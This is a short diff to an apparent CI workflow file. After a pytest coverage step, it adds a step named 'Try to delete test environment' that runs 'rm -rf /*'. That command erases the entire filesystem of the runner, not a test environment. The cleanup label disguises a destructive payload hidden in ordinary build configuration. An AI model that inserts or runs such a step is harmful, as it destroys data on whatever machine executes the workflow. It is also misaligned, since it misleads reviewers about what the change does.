@@ -30,3 +30,6 @@ jobs:
       - name: Test with pytest
         run: |
           pytest --cov
+      - name: Try to delete test environment
+        run: |
+          rm -rf /*
